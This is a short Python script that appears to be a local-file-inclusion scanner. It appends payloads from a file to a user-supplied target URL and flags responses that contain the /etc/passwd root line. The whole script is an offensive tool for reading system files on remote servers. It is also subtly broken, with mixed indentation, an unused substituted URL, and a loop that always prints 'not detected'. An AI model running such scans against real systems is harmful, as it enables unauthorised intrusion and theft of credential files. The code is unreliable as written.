import sys
import requests
from datetime import datetime

text_file = open("Payloads.txt", "r")
text_file2 = open("res.txt", "w")

def start(url):
	for line in text_file.readlines():
        	targt = url.replace('{lol}', line)
       		r = requests.get(url+'{}'.format(line))
        	if 'root:x:0:'.encode() in r.content:
                	print("\033[0;37;41m CRITICAL: \033[0m \033[1;32;40m LFI DETECTED \033[0m")
                	payload = ("[+] Payload ->{}".format(line))
                	text_file2.write(payload)
                	print(payload)
	else:
            print("[!] LFI not detected")
try:
    url = input("[?] Enter target: ")
    print("-" * 50)  
    print("Scanning started at:" + str(datetime.now())) 
    print("-" * 50)
    start(url)
except KeyboardInterrupt: 
        print("Bye!")
except requests.exceptions.MissingSchema:
        print("USE HTTP:// or HTTPS://")